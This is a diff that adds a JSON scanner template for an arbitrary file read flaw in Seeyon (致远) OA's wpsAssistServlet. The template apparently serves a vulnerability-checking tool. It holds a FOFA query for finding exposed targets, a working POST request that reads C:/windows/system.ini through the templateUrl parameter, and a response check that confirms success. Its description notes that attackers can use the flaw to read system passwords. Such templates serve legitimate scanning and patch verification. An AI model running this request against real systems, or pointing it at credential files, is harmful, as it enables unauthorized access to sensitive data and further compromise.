@@ -1,0 +1,36 @@
+{
+  "product": "致远OA",
+  "vul_name": "致远OA wpsAssistServlet 任意文件读取",
+  "type": "文件读取",
+  "vul_id": [],
+  "level": 3,
+  "vul_desc": "致远互联-OA wpsAssistServlet 存在任意文件读取漏洞，攻击者可读取系统密码等敏感信息进一步控制系统。",
+  "version": "",
+  "note": "",
+  "search": {
+    "FOFA": "app=“致远互联-OA” && title=“V8.0SP2”"
+  },
+  "protocol": "http",
+  "link": "https://blog.csdn.net/qq_36334672/article/details/135822955?spm=1001.2101.3001.6650.2&utm_medium=distribute.pc_relevant.none-task-blog-2%7Edefault%7EYuanLiJiHua%7EPosition-2-135822955-blog-134997757.235%5Ev43%5Epc_blog_bottom_relevance_base1&depth_1-utm_source=distribute.pc_relevant.none-task-blog-2%7Edefault%7EYuanLiJiHua%7EPosition-2-135822955-blog-134997757.235%5Ev43%5Epc_blog_bottom_relevance_base1&utm_relevant_index=5",
+  "fix": [
+    "升级系统"
+  ],
+  "exploit": {
+    "exp": {
+      "method": "post",
+      "follow": false,
+      "path": "/seeyon/wpsAssistServlet",
+      "data": "flag=template&templateUrl=C:/windows/system.ini"
+    },
+    "verify": {
+      "path": "",
+      "logic": "and",
+      "check": [
+        {
+          "status": 200,
+          "body": "for 16-bit app support"
+        }
+      ]
+    }
+  }
+}
